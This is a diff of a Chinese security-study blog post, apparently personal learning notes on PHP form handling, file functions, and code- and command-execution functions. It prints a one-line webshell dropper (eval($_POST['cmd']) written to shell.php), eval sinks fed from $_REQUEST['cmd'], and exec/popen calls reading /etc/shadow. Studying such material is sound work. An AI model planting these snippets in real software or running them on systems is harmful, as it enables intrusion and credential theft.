@@ -117,42 +117,18 @@
 
 
 
-  <meta name="description" content="本次使用的虚拟机是Windows Server 2008 R2，我要在上面搭建iis服务，并运行一个asp的网站。    前提：需要以下两个文件：   .net framework 4.7.2 一个asp的网站源码    操作步骤如下：   安装IIS之后再次点击下一步好无聊，iis装完了！照我这样选，基本的东西都有！ 配置IIS   删除默认网站和应用池   添加网站然后导入网站数据   改权限">
-<meta name="keywords" content="windows,iis,搭建,asp">
+  <meta name="description" content="表单处理 三种接收表单数据的方式$_GET、$_POST、$_REQUEST  特性： 超全局变量 都是数组    121.	$_GET	此方式接收表单的method=&amp;apos;get&amp;apos;方式传递的值 122.	$_POST	此方式接收表单的method=&amp;apos;post&amp;apos;方式传递的值 123.	$_REQUEST	此方式接收表单get/post方式传递的值  超全局变量$">
+<meta name="keywords" content="php,表单处理,文件,代码执行,命令执行">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Windows搭建IIS">
-<meta property="og:url" content="https://clancyb00m.github.io/2018/12/06/windows搭建iis/index.html">
+<meta property="og:title" content="php表单+文件+代码、命令执行">
+<meta property="og:url" content="https://clancyb00m.github.io/2018/12/17/php表单+文件+代码、命令执行/index.html">
 <meta property="og:site_name" content="T0mmclancy`s Blog">
-<meta property="og:description" content="本次使用的虚拟机是Windows Server 2008 R2，我要在上面搭建iis服务，并运行一个asp的网站。    前提：需要以下两个文件：   .net framework 4.7.2 一个asp的网站源码    操作步骤如下：   安装IIS之后再次点击下一步好无聊，iis装完了！照我这样选，基本的东西都有！ 配置IIS   删除默认网站和应用池   添加网站然后导入网站数据   改权限">
+<meta property="og:description" content="表单处理 三种接收表单数据的方式$_GET、$_POST、$_REQUEST  特性： 超全局变量 都是数组    121.	$_GET	此方式接收表单的method=&amp;apos;get&amp;apos;方式传递的值 122.	$_POST	此方式接收表单的method=&amp;apos;post&amp;apos;方式传递的值 123.	$_REQUEST	此方式接收表单get/post方式传递的值  超全局变量$">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/start01.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis01.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis02.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis03.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis04.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis05.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis06.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis07.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis08.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis09.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis10.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis11.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis12.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis13.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis14.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis15.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis16.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis17.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis18.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis19.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis20.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis21.png">
-<meta property="og:image" content="https://clancyb00m.github.io/img/181206/iis22.png">
-<meta property="og:updated_time" content="2018-12-10T12:28:59.547Z">
+<meta property="og:updated_time" content="2018-12-20T13:39:36.210Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Windows搭建IIS">
-<meta name="twitter:description" content="本次使用的虚拟机是Windows Server 2008 R2，我要在上面搭建iis服务，并运行一个asp的网站。    前提：需要以下两个文件：   .net framework 4.7.2 一个asp的网站源码    操作步骤如下：   安装IIS之后再次点击下一步好无聊，iis装完了！照我这样选，基本的东西都有！ 配置IIS   删除默认网站和应用池   添加网站然后导入网站数据   改权限">
-<meta name="twitter:image" content="https://clancyb00m.github.io/img/181206/start01.png">
+<meta name="twitter:title" content="php表单+文件+代码、命令执行">
+<meta name="twitter:description" content="表单处理 三种接收表单数据的方式$_GET、$_POST、$_REQUEST  特性： 超全局变量 都是数组    121.	$_GET	此方式接收表单的method=&amp;apos;get&amp;apos;方式传递的值 122.	$_POST	此方式接收表单的method=&amp;apos;post&amp;apos;方式传递的值 123.	$_REQUEST	此方式接收表单get/post方式传递的值  超全局变量$">
 
 
 
@@ -161,7 +137,7 @@
 
 
 
-  <link rel="canonical" href="https://clancyb00m.github.io/2018/12/06/windows搭建iis/">
+  <link rel="canonical" href="https://clancyb00m.github.io/2018/12/17/php表单+文件+代码、命令执行/">
 
 
 
@@ -171,7 +147,7 @@
   };
 </script>
 
-  <title>Windows搭建IIS | T0mmclancy`s Blog</title>
+  <title>php表单+文件+代码、命令执行 | T0mmclancy`s Blog</title>
   
 
 
@@ -385,7 +361,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://clancyb00m.github.io/2018/12/06/windows搭建iis/">
+    <link itemprop="mainEntityOfPage" href="https://clancyb00m.github.io/2018/12/17/php表单+文件+代码、命令执行/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="clancy">
@@ -402,7 +378,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Windows搭建IIS
+          <h1 class="post-title" itemprop="name headline">php表单+文件+代码、命令执行
               
             
           </h1>
@@ -427,7 +403,7 @@
                 
               
 
-              <time title="创建时间：2018-12-06 12:30:01" itemprop="dateCreated datePublished" datetime="2018-12-06T12:30:01+08:00">2018-12-06</time>
+              <time title="创建时间：2018-12-17 13:23:00" itemprop="dateCreated datePublished" datetime="2018-12-17T13:23:00+08:00">2018-12-17</time>
             
 
             
@@ -444,7 +420,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2018-12-10 20:28:59" itemprop="dateModified" datetime="2018-12-10T20:28:59+08:00">2018-12-10</time>
+                <time title="修改时间：2018-12-20 21:39:36" itemprop="dateModified" datetime="2018-12-20T21:39:36+08:00">2018-12-20</time>
               
             
           </span>
@@ -477,29 +453,118 @@
       
 
       
-        <p>本次使用的虚拟机是<code>Windows Server 2008 R2</code>，我要在上面搭建<code>iis</code>服务，并运行一个<code>asp</code>的网站。  </p>
+        <h1 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h1><ul>
+<li><p>三种接收表单数据的方式<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code></p>
 <ul>
-<li>前提：<br>需要以下两个文件：</li>
+<li>特性：<ul>
+<li>超全局变量</li>
+<li>都是数组</li>
 </ul>
-<ol>
-<li>.net framework 4.7.2</li>
-<li>一个asp的网站源码  </li>
-</ol>
-<p><img src="/img/181206/start01.png" alt="准备操作"><br>操作步骤如下：  </p>
-<h1 id="安装IIS"><a href="#安装IIS" class="headerlink" title="安装IIS"></a>安装IIS</h1><p><img src="/img/181206/iis01.png" alt="安装IIS"><br><img src="/img/181206/iis02.png" alt="安装IIS"><br><img src="/img/181206/iis03.png" alt="安装IIS"><br>之后再次点击下一步<br><img src="/img/181206/iis04.png" alt="安装IIS"><br><img src="/img/181206/iis05.png" alt="安装IIS"><br><img src="/img/181206/iis06.png" alt="安装IIS"><br><img src="/img/181206/iis07.png" alt="安装IIS"><br><img src="/img/181206/iis08.png" alt="安装IIS"><br><img src="/img/181206/iis09.png" alt="安装IIS"><br>好无聊，iis装完了！照我这样选，基本的东西都有！</p>
-<h1 id="配置IIS"><a href="#配置IIS" class="headerlink" title="配置IIS"></a>配置IIS</h1><p><img src="/img/181206/iis10.png" alt="安装IIS">  </p>
-<h3 id="删除默认网站和应用池"><a href="#删除默认网站和应用池" class="headerlink" title="删除默认网站和应用池"></a>删除默认网站和应用池</h3><p><img src="/img/181206/iis11.png" alt="安装IIS">  </p>
-<h3 id="添加网站"><a href="#添加网站" class="headerlink" title="添加网站"></a>添加网站</h3><p><img src="/img/181206/iis12.png" alt="安装IIS"><br><img src="/img/181206/iis13.png" alt="安装IIS"><br>然后导入网站数据  </p>
-<h3 id="改权限"><a href="#改权限" class="headerlink" title="改权限"></a>改权限</h3><blockquote>
-<p>改权限是为了能对网站进行各种操作<br><img src="/img/181206/iis14.png" alt="安装IIS"><br><img src="/img/181206/iis15.png" alt="安装IIS"><br><img src="/img/181206/iis16.png" alt="安装IIS">  </p>
-</blockquote>
-<h3 id="启用父路径"><a href="#启用父路径" class="headerlink" title="启用父路径"></a>启用父路径</h3><p><img src="/img/181206/iis17.png" alt="安装IIS"><br>False改为True<br><img src="/img/181206/iis18.png" alt="安装IIS">  </p>
-<h3 id="更改默认首页"><a href="#更改默认首页" class="headerlink" title="更改默认首页"></a>更改默认首页</h3><p><img src="/img/181206/iis19.png" alt="安装IIS"><br>这里去看下载的网站的源码，默认首页是什么格式的这里就怎么写<br><img src="/img/181206/iis20.png" alt="安装IIS">  </p>
-<h3 id="启用32位程序"><a href="#启用32位程序" class="headerlink" title="启用32位程序"></a>启用32位程序</h3><p><img src="/img/181206/iis21.png" alt="安装IIS"><br><img src="/img/181206/iis22.png" alt="安装IIS">  </p>
-<h3 id="选择-net-4版本"><a href="#选择-net-4版本" class="headerlink" title="选择.net 4版本"></a>选择.net 4版本</h3><p>由于我事前并没有安装，所以无法修改，所以这里没有截图，操作步骤同上，在选择<code>高级设置</code>的时候，这回选择<code>基本设置</code>，就可以在里面修改了。  </p>
-<blockquote>
-<p>如果本文有任何错误，欢迎留言给我：<a href="https://github.com/clancyb00m/clancyb00m.github.io/issues" target="_blank" rel="noopener">Contact Me！</a></p>
-</blockquote>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.	$_GET</span><br><span class="line">	此方式接收表单的method=&apos;get&apos;方式传递的值</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.	$_POST</span><br><span class="line">	此方式接收表单的method=&apos;post&apos;方式传递的值</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.	$_REQUEST</span><br><span class="line">	此方式接收表单get/post方式传递的值</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>超全局变量$_SERVER：用于收集客户端请求信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;SERVER_ADDR&apos;]		返回当前运行脚本所在的服务器的IP地址</span><br><span class="line">$_SERVER[&apos;REMOTE_ADDR&apos;]		返回浏览当前页面的用户的IP地址</span><br><span class="line">$_SERVER[&apos;SERVER_NAME&apos;]		服务器主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_HOST&apos;]		用户的主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_PORT&apos;]		用户连接到服务器的端口号</span><br><span class="line">$_SERVER[&apos;HTTP_HOST&apos;]		返回来自当前请求的Host头</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]	来源IP地址（从哪个IP地址跳转过来的）</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><ul>
+<li><p><code>fopen()</code>：打开文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen(文件名,打开文件的方式);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>打开文件常用的方式：<ul>
+<li><code>r</code>：只读方式打开，指针位置在文件开头</li>
+<li><code>r+</code>：读写方式打开，指针位置在文件开头</li>
+<li><code>w</code>：写入方式打开，清空文件内容，如果文件不存在则创建</li>
+<li><code>w+</code>：读写方式打开，清空文件内容，如果文件不存在则创建</li>
+<li><code>a</code>：追加，打开并向文件末尾进行写操作，如果文件不存在则创建</li>
+<li><code>a+</code>：可读并追加。通过向文件末尾写内容，来保持文件内容</li>
+<li><code>x</code>：只写，创建新文件。如果文件已存在，则返回FALSE和一个错误</li>
+<li><code>x+</code>：读写，创建新文件。如果文件已存在，则返回FALSE和一个错误</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>fgets()</code>：逐行读取文件，每次只读取一行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(文件名);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>fread()</code>：按长度读取文件的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread(文件名，长度);			换行也算一个长度</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>fwrite()</code>：写入文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite(文件名，内容);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>fputs</code>：<code>fwrite()</code>的别名</p>
+</li>
+<li><p><code>fclose()</code>：关闭一个打开的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fclose(文件名);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>feof()</code>：检测指针是否已到达文件末尾</p>
+<ul>
+<li>可以结合while循环来读取文件中所有的内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$file = fopen(&apos;a.txt&apos;,&apos;r&apos;);</span><br><span class="line">while(!feof($file))			//如果达到末尾，会返回TRUE</span><br><span class="line">&#123;</span><br><span class="line">    echo fgets($file);</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>unlink()</code>：删除文件</p>
+</li>
+<li><p><code>opendir()</code>：打开文件夹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = opendir(目录);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>readdir()</code>：读取文件夹（从目录句柄中读取条目）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readdir($file);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>closedir()</code>：关闭文件夹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">closedir($file);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>file_exists()</code>：检查文件或目录是否存在</p>
+</li>
+<li><p><code>copy()</code>：复制文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(源文件名,复制后的文件名);		可以移动的同时重命名文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>rename()</code>：重命名文件或目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename(源文件名,新文件名);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>file_get_contents()</code>：把整个文件读入一个字符串中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(文件[,include_path,context,start,max_length])</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>file_put_contents</code>：把一个字符串写入文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(string $filename,$data)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>用文件操作写一句话：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul>
+<li><p><code>eval()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数里可以使用单引号或者双引号</span><br><span class="line">使用单引号：变量不转义</span><br><span class="line">使用双引号：变量被转义</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>assert()</code></p>
+</li>
+<li><p><code>preg_replace()</code>：正则里面使用<code>/e</code>模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;cmd&apos;],&quot;abcd&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>create_function()</code>：创建函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$func = create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]); $func();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>$_GET[&#39;a&#39;]($_GET[&#39;b&#39;])</code>：动态创建函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">要求：PHP版本5.2以下才可以使用</span><br><span class="line">在地址栏中使用：a=assert&amp;b=phpinfo()	即可打印PHPinfo</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul>
+<li><p>exec()：使用它必须在第二个参数指定一个变量来接收执行的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;cat /etc/shadow&quot;,$output);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>system()：命令会直接执行，无需变量接收</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;phpinfo()&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>popen()：此函数是打开一个进程，可读取此进程的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = popen(&quot;cat /etc/shadow&quot;,&apos;r&apos;);</span><br><span class="line">echo fread($file,5000);</span><br><span class="line">pclose($file);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>shell_exec()：此函数需要一个变量在外接收它的结果并输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = shell_exec(&apos;ls -al&apos;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
 
       
     </div>
@@ -523,7 +588,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/windows-iis-搭建-asp/" rel="tag"><i class="fa fa-tag"></i> windows,iis,搭建,asp</a>
+            <a href="/tags/php-表单处理-文件-代码执行-命令执行/" rel="tag"><i class="fa fa-tag"></i> php,表单处理,文件,代码执行,命令执行</a>
           
         </div>
       
@@ -536,8 +601,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/05/学习总结/" rel="next" title="学习总结">
-                <i class="fa fa-chevron-left"></i> 学习总结
+              <a href="/2018/12/14/apache配置和虚拟主机/" rel="next" title="apache配置和虚拟主机">
+                <i class="fa fa-chevron-left"></i> apache配置和虚拟主机
               </a>
             
           </div>
@@ -546,8 +611,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/12/07/rpm安装php/" rel="prev" title="rpm安装php">
-                rpm安装php <i class="fa fa-chevron-right"></i>
+              <a href="/2018/12/18/PHP文件包含、cookie、文件上传/" rel="prev" title="PHP文件包含、cookie、文件上传">
+                PHP文件包含、cookie、文件上传 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -702,7 +767,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#安装IIS"><span class="nav-number">1.</span> <span class="nav-text">安装IIS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#配置IIS"><span class="nav-number">2.</span> <span class="nav-text">配置IIS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#删除默认网站和应用池"><span class="nav-number">2.0.1.</span> <span class="nav-text">删除默认网站和应用池</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#添加网站"><span class="nav-number">2.0.2.</span> <span class="nav-text">添加网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#改权限"><span class="nav-number">2.0.3.</span> <span class="nav-text">改权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启用父路径"><span class="nav-number">2.0.4.</span> <span class="nav-text">启用父路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#更改默认首页"><span class="nav-number">2.0.5.</span> <span class="nav-text">更改默认首页</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启用32位程序"><span class="nav-number">2.0.6.</span> <span class="nav-text">启用32位程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#选择-net-4版本"><span class="nav-number">2.0.7.</span> <span class="nav-text">选择.net 4版本</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#表单处理"><span class="nav-number">1.</span> <span class="nav-text">表单处理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件操作"><span class="nav-number">2.</span> <span class="nav-text">文件操作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#代码执行"><span class="nav-number">3.</span> <span class="nav-text">代码执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#命令执行"><span class="nav-number">4.</span> <span class="nav-text">命令执行</span></a></li></ol></div>
             
 
           </div>
@@ -881,7 +946,7 @@
   
     <script type="text/javascript">
       window.livereOptions = {
-        refer: '2018/12/06/windows搭建iis/'
+        refer: '2018/12/17/php表单+文件+代码、命令执行/'
       };
       (function(d, s) {
         var j, e = d.getElementsByTagName(s)[0];
